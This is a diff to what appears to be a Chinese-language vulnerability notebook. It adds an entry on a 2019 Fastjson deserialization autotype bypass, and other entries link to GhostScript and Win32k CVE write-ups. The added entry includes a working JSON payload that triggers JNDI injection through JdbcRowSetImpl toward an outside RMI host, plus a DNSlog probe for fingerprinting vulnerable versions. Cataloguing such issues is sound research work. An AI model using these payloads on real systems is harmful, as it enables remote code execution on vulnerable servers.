@@ -9,6 +9,13 @@ share: true
 
 2019
 ---
+1. **【2019-07-10】Fastjson反序列化命令执行，Autotype绕过**
+    - `com.alibaba.fastjson.serializer.MiscCodec`定义了特定class的序列化与反序列化逻辑，包括java.lang.Class等。利用java.lang.Class可以实例化`com.sun.rowset.JdbcRowSetImpl`。由于Fastjson的缓存特性，在利用com.sun.rowset.JdbcRowSetImpl进行JNDI注入时，直接从缓存表中取对象实例，则可以绕过autotype限制。
+    - PoC: `{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://9.9.9.9:2333/Object","autoCommit":true}}`
+    - 检测：`{"@type":"java.net.InetAddress","val":"inetaddress.fastjson.rxxoow.ceye.io"}`
+    - java.net.InetAddress类在fastjson 1.2.48中被加入了autotype黑名单，如果dnslog服务器成功收到请求，则说明目标fastjson版本低于1.2.48。
+    - 
+
 1. **【20190615】Weblogic漏洞CVE-2019-2725绕过**
     - TODO
 
@@ -181,6 +188,7 @@ https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0
 1. **【20181010】GhostScript命令执行漏洞Bypass CVE-2018-17961**
     - 描述：<https://seclists.org/oss-sec/2018/q4/28>
     - POC：<https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&desc=2>
+
 
 1. **【20181009】CVE-2018-8453 | Win32k Elevation of Privilege Vulnerability**
     - Zero-day exploit (CVE-2018-8453) used in targeted attacks <https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/>
